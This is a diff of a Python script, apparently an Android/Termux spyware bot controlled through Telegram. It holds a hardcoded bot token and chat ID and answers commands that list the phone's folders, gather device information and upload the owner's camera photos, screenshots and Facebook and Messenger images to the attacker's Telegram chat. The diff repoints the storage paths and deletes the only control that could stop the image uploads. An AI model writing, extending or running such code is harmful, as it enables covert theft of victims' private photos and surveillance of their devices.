@@ -1,23 +1,19 @@
 import os
 import requests
 import subprocess
-import threading
 
 # Replace with your bot token and chat ID
 TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
 CHAT_ID = '6285177516'
 
 # Global variables
-current_folder = "/storage/emulated/0/"
+current_folder = "/data/data/com.termux/files/home/storage/shared/"
 directories_to_search = [
-    "/storage/emulated/0/DCIM/Camera",
-    "/storage/emulated/0/DCIM/Facebook",
-    "/storage/emulated/0/Pictures/Screenshots",
-    "/storage/emulated/0/Pictures/Messenger"
+    "/data/data/com.termux/files/home/storage/shared/DCIM/Camera",
+    "/data/data/com.termux/files/home/storage/shared/DCIM/Facebook",
+    "/data/data/com.termux/files/home/storage/shared/Pictures/Screenshots",
+    "/data/data/com.termux/files/home/storage/shared/Pictures/Messenger"
 ]
-
-# Flag to control image sending
-send_images_active = True
 
 # Function to escape special characters for Telegram Markdown
 def escape_markdown(text):
@@ -106,17 +102,12 @@ def handle_folder_navigation(folder_name):
 
 # Function to download and send images from specified directories
 def download_and_send_images():
-    global send_images_active
     try:
         sent_files = set()
         for directory in directories_to_search:
             if os.path.isdir(directory):
                 for filename in os.listdir(directory):
                     if filename.lower().endswith(('.png', '.jpg')):
-                        if not send_images_active:
-                            send_to_telegram("Image sending is currently stopped.")
-                            return "Image sending is stopped."
-                        
                         src_path = os.path.join(directory, filename)
                         if filename not in sent_files:
                             send_to_telegram(f"Sending image `{filename}`...", document=src_path)
@@ -164,7 +155,6 @@ def get_device_info():
 
 # Function to handle Telegram bot commands
 def handle_telegram_update(update):
-    global send_images_active
     try:
         message = update.get('message', {}).get('text', '')
         if message:
@@ -177,12 +167,6 @@ def handle_telegram_update(update):
                     send_to_telegram(get_storage_list(current_folder))
                 elif message == '/download_images':
                     send_to_telegram(download_and_send_images())
-                elif message == '/download_images_stop':
-                    send_images_active = False
-                    send_to_telegram("Image sending has been stopped.")
-                elif message == '/download_images_start':
-                    send_images_active = True
-                    send_to_telegram("Image sending has been resumed.")
                 else:
                     send_to_telegram(f"Unknown command `{message}`.")
             else:
